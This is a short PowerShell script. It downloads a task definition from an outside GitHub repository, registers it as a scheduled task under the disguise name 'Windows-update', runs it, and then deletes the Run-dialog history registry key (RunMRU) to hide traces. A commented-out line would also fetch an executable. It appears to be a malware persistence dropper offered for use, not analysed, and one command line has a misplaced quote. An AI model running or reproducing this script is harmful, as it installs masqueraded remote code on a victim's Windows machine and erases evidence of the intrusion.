$client = new-object System.Net.WebClient
$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.xml'
$file = 'SystemTask.xml'
$client.DownloadFile($url,$file)
#$url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
#$file = 'SystemTask.exe'
#$client.DownloadFile($url,$file)
$command = 'schtasks.exe /create /tn Windows-update /xml SystemTask.xml' /f
iex $command
$command = 'schtasks.exe /run /tn Windows-update'
iex $command
$command = 'Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse'
iex $command
